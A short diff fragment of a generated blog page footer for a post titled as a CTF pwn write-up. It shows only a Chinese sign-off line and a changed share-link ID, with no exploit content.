 <p>先不写了，之后更新看心情了。-.-</p>
 
@@ -369,7 +370,7 @@
 
     <footer class="article-footer">
       
-        <a data-url="http://tianstcht.github.io/NEX招新赛-pwn-writeup/" data-id="ck2923nr90004zkvg6j37kt3y" class="article-share-link" data-share="baidu" data-title="NEX招新赛-pwn-writeup">分享到</a>
+        <a data-url="http://tianstcht.github.io/NEX招新赛-pwn-writeup/" data-id="ck2924ko00004tkvgekeypzw7" class="article-share-link" data-share="baidu" data-title="NEX招新赛-pwn-writeup">分享到</a>
       
 
       
